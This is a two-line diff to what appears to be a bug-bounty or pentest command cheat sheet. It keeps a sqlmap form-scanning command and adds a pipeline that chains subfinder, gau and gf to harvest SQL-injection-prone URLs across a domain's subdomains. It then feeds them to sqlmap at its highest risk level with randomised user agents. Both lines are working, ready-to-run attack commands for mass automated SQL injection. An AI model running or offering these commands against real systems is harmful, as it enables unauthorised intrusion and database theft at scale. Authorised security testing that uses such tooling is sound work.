@@ -1,1 +1,2 @@
 sqlmap --forms --batch -u "http://somewebsite/"
+subfinder -d $DOMAIN -silent -all | gau -b ttf,woff,svg,png,jpg | sort -u | gf sqli > found.txt; sqlmap -m found.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
